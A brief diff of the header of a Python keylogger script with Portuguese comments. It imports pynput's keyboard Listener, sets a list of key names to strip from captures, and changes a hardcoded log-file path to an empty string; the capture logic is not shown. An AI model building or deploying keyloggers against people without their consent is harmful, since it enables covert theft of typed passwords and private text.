@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener # Importa a biblioteca Listener do pynput.keyboard para capturar as teclas pressionadas
 import re # Importa a biblioteca re para usar expressões regulares
 
-file_log = "/home/kiraz/Desktop/Keylogger_python-master/key.log" # Caminho do arquivo de log que armazenará as teclas capturadas
+file_log = "" # Caminho do arquivo de log que armazenará as teclas capturadas
 clean_chars = ["'", "Key.space", "Key.enter"] # Lista de caracteres que serão removidos das teclas capturadas
 
 # Função que captura as teclas pressionadas pelo usuário e as processa
